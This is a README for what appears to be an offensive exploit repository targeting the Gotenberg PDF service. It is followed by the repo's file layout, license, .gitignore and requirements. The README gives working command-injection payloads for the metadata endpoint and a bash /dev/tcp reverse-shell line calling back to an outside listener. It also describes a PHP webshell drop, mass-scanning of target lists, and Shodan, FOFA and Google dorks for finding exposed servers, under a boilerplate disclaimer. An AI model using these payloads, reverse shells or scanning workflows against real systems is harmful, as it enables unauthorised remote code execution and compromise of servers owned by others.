````markdown
<div align="center">

# 🔥 GOTENBERG RCE CHAIN

### CVE-2026-42589 + CVE-2026-40281

![Python](https://img.shields.io/badge/python-3.8%2B-blue?style=for-the-badge&logo=python)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
![CVE](https://img.shields.io/badge/CVE-2026--42589-red?style=for-the-badge)
![CVE](https://img.shields.io/badge/CVE-2026--40281-red?style=for-the-badge)
![CVSS](https://img.shields.io/badge/CVSS-10.0%20CRITICAL-critical?style=for-the-badge)

<img src="https://i.postimg.cc/dV5Jz53n/Screenshot-2026-10-03-1.png" alt="Interactive Shell" width="700"/>

**Gotenberg ≤ 8.30.1 — Unauthenticated Remote Code Execution**

*Chained exploit with reverse shell + File Manager webshell + interactive blind-safe mode*

</div>

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Vulnerabilities](#-vulnerabilities)
- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
- [Screenshots](#-screenshots)
- [How It Works](#-how-it-works)
- [Detection Dorks](#-detection-dorks)
- [FAQ](#-faq)
- [Contact](#-contact)
- [Disclaimer](#-disclaimer)

---

## 🎯 Overview

**Gotenberg** is a stateless Docker-powered API that converts documents (HTML, Markdown, Office...) into PDF. Versions **≤ 8.30.1** are vulnerable to **two critical unauthenticated RCE vulnerabilities** at the `/forms/pdfengines/metadata/write` endpoint.

This repository ships **two tools** that chain both CVEs into a single exploitation workflow:

| Tool | Purpose |
|------|---------|
| **`gotenberg_rce.py`** | Detection + interactive shell + File Manager webshell drop |
| **`auto_revshell.py`** | Auto-detect IP → start listener → fire reverse shell payloads → interactive session |

---

## 🐛 Vulnerabilities

### CVE-2026-42589 — Metadata Key Injection

| Field | Value |
|-------|-------|
| **Type** | OS Command Injection (RCE) |
| **CVSS** | 9.8 — Critical |
| **Vector** | `POST /forms/pdfengines/metadata/write` |
| **Injection** | JSON metadata **keys** |
| **Root Cause** | `system()` via ExifTool config |

### CVE-2026-40281 — Metadata Value Injection (Perl)

| Field | Value |
|-------|-------|
| **Type** | OS Command Injection (RCE) |
| **CVSS** | 10.0 — Critical |
| **Vector** | `POST /forms/pdfengines/metadata/write` |
| **Injection** | JSON metadata **values** |
| **Root Cause** | `qx()` (Perl) via ExifTool |

### Affected Versions

| Version | 42589 | 40281 |
|---------|:-----:|:-----:|
| `< 8.29.1` | ✅ | ✅ |
| `8.29.1`   | ✅ | ✅ |
| `8.30.0`   | ✅ | ✅ |
| **`8.30.1`** | ✅ | ✅ |
| `≥ 8.31.0` | ❌ | ❌ |

---

## ✨ Features

- 🔍 **Reliable detection** — direct (marker) + blind (timing + HTTP 500)
- 🎯 **Dual-CVE exploitation** — tries both `40281` and `42589`
- 🐚 **Auto reverse shell** — 7 payload fallbacks (bash, python, nc, perl, mkfifo)
- 📡 **Auto IP detection** — 4 public APIs in fallback order
- 🕸️ **File Manager webshell** — dark-theme PHP web UI (upload / browse / exec / delete)
- 🖥️ **Interactive shell** — with meta-commands (`!upload`, `!shell`, `!check`, `!clear`)
- 🧵 **Multi-threaded** — mass scanning support
- 🛡️ **Blind-safe** — works even when the target returns `HTTP 500`
- 🎨 **Colored output** — clean, readable logging

---

## 📦 Installation

### Requirements

- Python **3.8+**
- `requests`, `urllib3`

### Setup

```bash
git clone https://github.com/HackfutSecRoot/-GOTENBERG-RCE-CHAIN.git
cd -GOTENBERG-RCE-CHAIN

python3 -m venv venv
source venv/bin/activate     # Linux/Mac
# venv\Scripts\activate      # Windows

pip install -r requirements.txt
```

### `requirements.txt`

```
requests>=2.28.0
urllib3>=1.26.0
```

---

## 🚀 Usage

### 🐚 Auto Reverse Shell (`auto_revshell.py`)

```bash
python auto_revshell.py -u http://target:3000
```

**Auto-detect** your public IP → **bind** listener → **exploit** target → **drop you into a shell**.

#### Manual IP

```bash
python auto_revshell.py -u http://target:3000 --lhost 1.2.3.4 --lport 4444
```

#### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-u, --url` | Target URL **(required)** | — |
| `--lhost` | Your public IP | auto-detected |
| `--lport` | Listener port | `4444` |
| `--wait` | Seconds to wait for callback | `25` |
| `--timeout` | Per-request timeout | `60` |
| `--no-banner` | Skip banner | `false` |

---

### 🖥️ Interactive Shell (`gotenberg_rce.py`)

```bash
python gotenberg_rce.py -u http://target:3000 -i
```

Drops you into an interactive pseudo-shell:

```
rOOt@HFT:~$ id
uid=0(root) gid=0(root) groups=0(root)

rOOt@HFT:~$ uname -a
Linux gotenberg 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 x86_64 GNU/Linux

rOOt@HFT:~$ !shell
[*] Shell URL: http://target:3000/var/www/html/fm_abc123.php

rOOt@HFT:~$ exit
[*] Exiting interactive shell.
```

#### Commands

| Flag | Description |
|------|-------------|
| `-u, --url` | Single target |
| `-f, --file` | File with targets (one per line) |
| `-t, --threads` | Threads for mass scan |
| `--check-only` | Only detect, no exploitation |
| `--shell` | Drop File Manager webshell |
| `-i, --interactive` | Enter interactive shell |
| `-o, --output` | Save results |

#### Meta-commands (inside interactive shell)

| Command | Action |
|---------|--------|
| `help`, `?` | Show help |
| `exit`, `quit`, `q` | Quit |
| `!upload` | Re-deploy File Manager shell |
| `!shell` | Show shell URL |
| `!check` | Re-check vulnerability |
| `!clear` | Clear screen |

---

### 📡 Mass Scan + Webshell

```bash
python gotenberg_rce.py -f targets.txt --shell -t 20 -o results.txt
```

**`targets.txt`:**

```
# one URL per line
http://1.2.3.4:3000
https://gotenberg.internal:3000
http://5.6.7.8:3000
```

---

## 📸 Screenshots

<div align="center">
<img src="https://i.postimg.cc/dV5Jz53n/Screenshot-2026-10-03-1.png" alt="Interactive shell" width="800"/>
</div>

### Reverse Shell

```
[*] Detecting public IP...
[+] Public IP: 1.2.3.4
[+] Listener bound on 0.0.0.0:4444

[*] Sending reverse shell to 1.2.3.4:4444...
    [1/7] bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'...

[+] CALLBACK RECEIVED from 134.199.148.233
[*] Entering interactive shell. Type 'exit' to quit.

# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
gotenberg
```

---

## 🔬 How It Works

### 1. Detection

The tool sends a controlled payload to `/forms/pdfengines/metadata/write`:

```http
POST /forms/pdfengines/metadata/write HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--BOUNDARY
Content-Disposition: form-data; name="files"; filename="test.pdf"
Content-Type: application/pdf

%PDF-1.4
...
--BOUNDARY
Content-Disposition: form-data; name="metadata"

{"Title":"test\n-Title<${PDFVersion;$_=qx("echo MARKER")}>"}
--BOUNDARY--
```

**Signals analyzed:**

| Response | Meaning |
|----------|---------|
| `HTTP 200` + marker | **Direct RCE** |
| `HTTP 500` + long delay | **Blind RCE** |
| `HTTP 400` | Patched or invalid payload |
| `HTTP 404` | Not Gotenberg |

### 2. Exploitation

Two injection vectors are tried:

**CVE-2026-40281** — Perl injection in metadata **keys**:
```json
{"Title\n-Title<${PDFVersion;$_=qx("CMD")}>": "x"}
```

**CVE-2026-42589** — `system()` injection in metadata **values**:
```json
{"Title\n-if\nsystem('CMD')||1\n-Comment": "x"}
```

### 3. Output Extraction

Commands are wrapped between unique markers and base64-encoded:

```bash
echo MARKER_START; (CMD) 2>&1 | base64; echo MARKER_END
```

The tool parses the PDF response (including zlib-compressed streams) and extracts the base64 blob between markers.

### 4. Blind Mode

When the target returns `HTTP 500` (crash after command execution), the tool:
- Confirms RCE via **timing** (`sleep 8` → ~8s delay)
- Falls back to **reverse shell** or **OOB exfiltration**

---

## 🔎 Detection Dorks

### Shodan

```
ssl:"gotenberg" port:443
org:"Gotenberg" http.status:200
ssl:"thecodingmachine" port:443
org:"Thecodingmachine" http.status:200
http.html:"Gotenberg" port:3000
```

### FOFA

```
body="Gotenberg"
port="3000" && body="Gotenberg"
body="/forms/chromium/convert/url"
body="/forms/pdfengines/metadata/write"
```

### Google

```
inurl:"/forms/chromium/convert/url"
inurl:"/forms/pdfengines/metadata/write"
intitle:"Gotenberg"
```

### Verify a target

```bash
curl -s http://TARGET:3000/version
# vulnerable if < 8.31.0
```

---

## ❓ FAQ

### "Could not deploy shell — falling back to blind command mode"

Your target is **pure Gotenberg** — no web server, no PHP. Use the reverse shell instead:

```bash
python auto_revshell.py -u http://target:3000
```

### "No callback received"

1. Your public IP must be reachable **from the target**
2. Port `<lport>` must be open in your firewall
3. If behind NAT, **port-forward** `<lport>` on your router
4. Or use a **VPS** / **ngrok** as a relay:
   ```bash
   ngrok tcp 4444
   # → tcp://0.tcp.ngrok.io:12345
   # Use: --lhost 0.tcp.ngrok.io --lport 12345
   ```

### "HTTP 400 on both CVEs"

Target is **patched** (≥ 8.31.0). Verify:

```bash
curl -s http://target:3000/version
```

### "HTTP 500 but no output"

Command **ran** but PDF crashed. This is **blind RCE**:

- Use `auto_revshell.py`
- Or OOB exfiltration (curl to your listener)

### Why not File Manager PHP on Gotenberg?

Gotenberg is a **microservice**:

- ❌ No Apache / Nginx
- ❌ No PHP
- ❌ No web root
- ✅ Only API endpoints on port `3000`

→ **Reverse shell is the only viable option.**

---

## 📢 Contact

<div align="center">

**GitHub:** [@HackfutSecRoot](https://github.com/HackfutSecRoot)

**Channel 1:** [t.me/+gsrpvshwGUc5MzI0](https://t.me/+gsrpvshwGUc5MzI0)
**Channel 2:** [t.me/LinxProdXs404](https://t.me/LinxProdXs404)

**ULP Cloud:** [@ulp_CLOUD1](https://t.me/ulp_CLOUD1)
**DM:** [@HackfutS3c](https://t.me/HackfutS3c)

**Posts:**
- [t.me/LinxProdXs404/249](https://t.me/LinxProdXs404/249)
- [t.me/LinxProdXs404/541](https://t.me/LinxProdXs404/541)

</div>

---

## ⚠️ Disclaimer

**This tool is provided for educational and authorized security research only.**

- ✅ Use on **your own** infrastructure
- ✅ Use on **bug bounty** targets within scope
- ✅ Use on **authorized pentest** engagements
- ❌ **Never** use on systems you don't own or have **written permission** to test

The author assumes **no liability** for misuse or damage caused by this tool.

By using this software, you agree to comply with all applicable laws.

---

## 🙏 Credits

- **Author:** [Hackfut](https://github.com/HackfutSecRoot)
- **Research:** Independent security research
- **Original CVE references:**
  - [CVE-2026-42589](https://nvd.nist.gov/vuln/detail/CVE-2026-42589)
  - [CVE-2026-40281](https://nvd.nist.gov/vuln/detail/CVE-2026-40281)

---

## 📜 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

### ⭐ If you find this useful, drop a star! ⭐

**Made with ❤️ by [Hackfut](https://github.com/HackfutSecRoot)**

</div>
````

---

## 📁 Structure finale du repo

```
-GOTENBERG-RCE-CHAIN/
├── README.md                    ← ce fichier
├── LICENSE                      ← MIT
├── requirements.txt             ← requests, urllib3
├── .gitignore
│
├── gotenberg_rce.py             ← Outil 1 : interactive shell + webshell
├── auto_revshell.py             ← Outil 2 : reverse shell auto
│
├── targets.txt                  ← exemple
├── results.txt                  ← généré
│
└── docs/
    └── screenshot.png           ← capture du shell interactif
```

---

## 📄 **LICENSE** (MIT)

```text
MIT License

Copyright (c) 2026 Hackfut

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 📄 **.gitignore**

```text
# Python
__pycache__/
*.py[cod]
venv/
env/
.env

# Results
results.txt
shell.txt
*.log

# IDE
.vscode/
.idea/
*.swp

# OS
.DS_Store
Thumbs.db
```

---

## 📄 **requirements.txt**

```text
requests>=2.28.0
urllib3>=1.26.0
```
